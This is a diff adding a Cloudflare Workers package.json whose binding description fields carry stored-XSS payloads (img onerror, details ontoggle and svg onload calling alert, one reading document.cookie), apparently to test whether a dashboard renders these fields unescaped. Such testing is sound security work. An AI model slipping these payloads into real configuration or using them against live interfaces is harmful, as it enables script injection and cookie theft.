@@ -1,0 +1,30 @@
+{
+  "name": "edge-kv-cach1234",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "dev": "wrangler dev",
+    "deploy": "wrangler deploy"
+  },
+  "cloudflare": {
+    "bindings": {
+      "vars": {
+        "API_KEY": {
+          "description": "Your API key <img src=x onerror=alert(document.domain)>"
+        },
+        "WEBHOOK_URL": {
+          "description": "Webhook endpoint <details open ontoggle=alert('XSS')><summary>url</summary></details>"
+        }
+      },
+      "kv_namespaces": {
+        "CACHE": {
+          "description": "KV store for caching <svg/onload=alert(document.cookie)>"
+        }
+      }
+    }
+  },
+  "devDependencies": {
+    "wrangler": "^3.99.0",
+    "typescript": "^5.0.0"
+  }
+}
